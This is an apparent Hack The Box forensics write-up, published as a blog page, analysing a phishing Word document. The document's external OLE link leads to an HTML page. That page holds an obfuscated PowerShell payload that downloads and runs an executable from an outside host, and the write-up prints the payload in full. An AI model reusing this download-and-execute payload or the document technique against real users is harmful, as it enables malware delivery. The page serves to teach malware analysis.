@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+    <head lang="en">
+        <meta charset="utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Diagnostic - ~/xv1&#39;s projects</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="../../../css/fonts.css" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" media="screen" href="../../../css/main.css" />
+    </head>
+    <body>
+        <div class="content">
+            <header>
+                <div class="main">
+                    <a href="../../../index.html">~/xv1&#39;s projects</a>
+                </div>
+                <nav>
+                    
+                    <a href="../../../writeups/index.html">./writeups</a>
+                    
+                </nav>
+            </header>
+            <main>
+                <article>
+                    <div class="title">
+                        <h1 class="title">Diagnostic</h1>
+                        <div class="meta">Posted on Apr 8, 2024</div>
+                    </div>
+                    <div class="post-tags">
+                        <nav class="nav tags">
+                            <ul class="tags">
+                                <li><a href="/tags/htb">htb</a></li>
+                                <li><a href="/tags/forensics">forensics</a></li>
+                            </ul>
+                        </nav>
+                    </div>
+                    <section class="body">
+                        <blockquote>
+                            <p>Our SOC has identified numerous phishing emails coming in claiming to have a document about an upcoming round of layoffs in the company. The emails all contain a link to diagnostic.htb/layoffs.doc. The DNS for that domain has since stopped resolving, but the server is still hosting the malicious document (your docker). Take a look and figure out what&rsquo;s going on.</p>
+                        </blockquote>
+                        <h4 id="steps">Steps</h4>
+                        <ol>
+                            <li>Connecting to the instance with <code>nc</code> returned nothing, so I navigated to the webpage</li>
+                            <li>The webpage returned a <code>404</code>, so I added the domain from the description to my host file</li>
+                        </ol>
+                        <div class="highlight">
+                            <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>└─$ sudo sh -c <span style="color:#e6db74">&#34;echo &#39;94.237.62.195 diagnostic.htb&#39; &gt;&gt; /etc/hosts&#34;</span>
+</span></span></code></pre>
+                        </div>
+                        <ol start="3">
+                            <li>Navigating to <code>http://94.237.62.195:43141/layoffs.doc</code>, I downloaded the doc file</li>
+                        </ol>
+                        <div class="highlight">
+                            <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>└─$ file diagnostic.doc
+</span></span><span style="display:flex;"><span>diagnostic.doc: Zip archive data, at least v2.0 to extract, compression method<span style="color:#f92672">=</span>store
+</span></span></code></pre>
+                        </div>
+                        <ol start="4">
+                            <li>Unzipping the file, I got the directories <code>docProp</code>, <code>word</code>, <code>_rels</code>, and a <code>Content_types</code> xml document</li>
+                            <li>All of the directories contained xml files</li>
+                            <li>I recursively grepped for <code>html</code> to see if I cound find any other pages hosted on the instance</li>
+                        </ol>
+                        <div class="highlight">
+                            <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>└─$ grep -r html
+</span></span><span style="display:flex;"><span>_rels/document.xml.rels:&lt;Relationships xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/package/2006/relationships&#34;</span>&gt;&lt;Relationship Id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rId3&#34;</span> Type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings&#34;</span> Target<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;webSettings.xml&#34;</span>/&gt;&lt;Relationship Id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rId2&#34;</span> Type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings&#34;</span> Target<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;settings.xml&#34;</span>/&gt;&lt;Relationship Id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rId1&#34;</span> Type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles&#34;</span> Target<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;styles.xml&#34;</span>/&gt;&lt;Relationship Id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rId996&#34;</span> Type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject&#34;</span> Target<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://diagnostic.htb:43141/223_index_style_fancy.html!&#34;</span> TargetMode<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;External&#34;</span>/&gt;&lt;Relationship Id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rId5&#34;</span> Type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme&#34;</span> Target<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;theme/theme1.xml&#34;</span>/&gt;&lt;Relationship Id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rId4&#34;</span> Type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable&#34;</span> Target<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;fontTable.xml&#34;</span>/&gt;&lt;/Relationships&gt;
+</span></span><span style="display:flex;"><span>document.xml:   &lt;/v:shape&gt;&lt;o:OLEObject Type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Link&#34;</span> ProgID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;htmlfile&#34;</span> ShapeID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;_x0000_i1025&#34;</span> DrawAspect<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content&#34;</span> r:id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rId996&#34;</span> UpdateMode<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;OnCall&#34;</span>&gt;
+</span></span></code></pre>
+                        </div>
+                        <ol start="7">
+                            <li><code>Target=&quot;http://diagnostic.htb:43141/223_index_style_fancy.html!&quot;</code></li>
+                            <li>The site loaded as a blank page</li>
+                            <li>Viewing source brough up a ton of data which appeared to be base64 encoded
+                                <img src="imgz/diag.png" alt="image">
+                            </li>
+                            <li>I used cyberchef for decoding. The data under the comment seemed like some type of song</li>
+                            <li>The data within the codeblock returned this:</li>
+                        </ol>
+                        <pre tabindex="0"><code>${f`ile} = (&#34;{7}{1}{6}{8}{5}{3}{2}{4}{0}&#34;-f&#39;}.exe&#39;,&#39;B{msDt_4s_A_pr0&#39;,&#39;E&#39;,&#39;r...s&#39;,&#39;3Ms_b4D&#39;,&#39;l3&#39;,&#39;toC&#39;,&#39;HT&#39;,&#39;0l_h4nD&#39;)
+&amp;(&#34;{1}{2}{0}{3}&#34;-f&#39;ues&#39;,&#39;Invoke&#39;,&#39;-WebReq&#39;,&#39;t&#39;) (&#34;{2}{8}{0}{4}{6}{5}{3}{1}{7}&#34;-f &#39;://au&#39;,&#39;.htb/2&#39;,&#39;h&#39;,&#39;ic&#39;,&#39;to&#39;,&#39;agnost&#39;,&#39;mation.di&#39;,&#39;/n.exe&#39;,&#39;ttps&#39;) -OutFile &#34;C:\Windows\Tasks\$file&#34;
+&amp;(((&#34;{5}{6}{2}{8}{0}{3}{7}{4}{1}&#34; -f&#39;L9FTasksL9F&#39;,&#39;ile&#39;,&#39;ow&#39;,&#39;L&#39;,&#39;f&#39;,&#39;C:&#39;,&#39;L9FL9FWind&#39;,&#39;9FkzH&#39;,&#39;sL9F&#39;))  -CReplAce&#39;kzH&#39;,[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92)
+</code></pre>
+                        <ol start="12">
+                            <li>The important section is this:</li>
+                        </ol>
+                        <pre tabindex="0"><code>${f`ile} = (&#34;{7}{1}{6}{8}{5}{3}{2}{4}{0}&#34;-f&#39;}.exe&#39;,&#39;B{msDt_4s_A_pr0&#39;,&#39;E&#39;,&#39;r...s&#39;,&#39;3Ms_b4D&#39;,&#39;l3&#39;,&#39;toC&#39;,&#39;HT&#39;,&#39;0l_h4nD&#39;)
+</code></pre>
+                        <ol start="13">
+                            <li>I ran it in powershell then printed the file contents</li>
+                        </ol>
+                        <div class="highlight">
+                            <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\🤨</span>&gt; <span style="color:#e6db74">${</span>f<span style="color:#e6db74">`</span>ile<span style="color:#f92672">}</span> <span style="color:#f92672">=</span> <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;{7}{1}{6}{8}{5}{3}{2}{4}{0}&#34;</span>-f<span style="color:#e6db74">&#39;}.exe&#39;</span>,<span style="color:#e6db74">&#39;B{msDt_4s_A_pr0&#39;</span>,<span style="color:#e6db74">&#39;E&#39;</span>,<span style="color:#e6db74">&#39;r...s&#39;</span>,<span style="color:#e6db74">&#39;3Ms_b4D&#39;</span>,<span style="color:#e6db74">&#39;l3&#39;</span>,<span style="color:#e6db74">&#39;toC&#39;</span>,<span style="color:#e6db74">&#39;HT&#39;</span>,<span style="color:#e6db74">&#39;0l_h4nD&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\🤨</span>&gt; echo $file
+</span></span><span style="display:flex;"><span>HTB<span style="color:#f92672">{</span>msDt_4s_A_pr0toC0l_h4nDl3r...sE3XXXXXX<span style="color:#f92672">}</span>.exe
+</span></span></code></pre>
+                        </div>
+                    </section>
+                </article>
+            </main>
+            <footer>
+                <div class="footer-info">
+                    xv1 2024-4L 
+                    
+                </div>
+            </footer>
+        </div>
+    </body>
+</html>
+
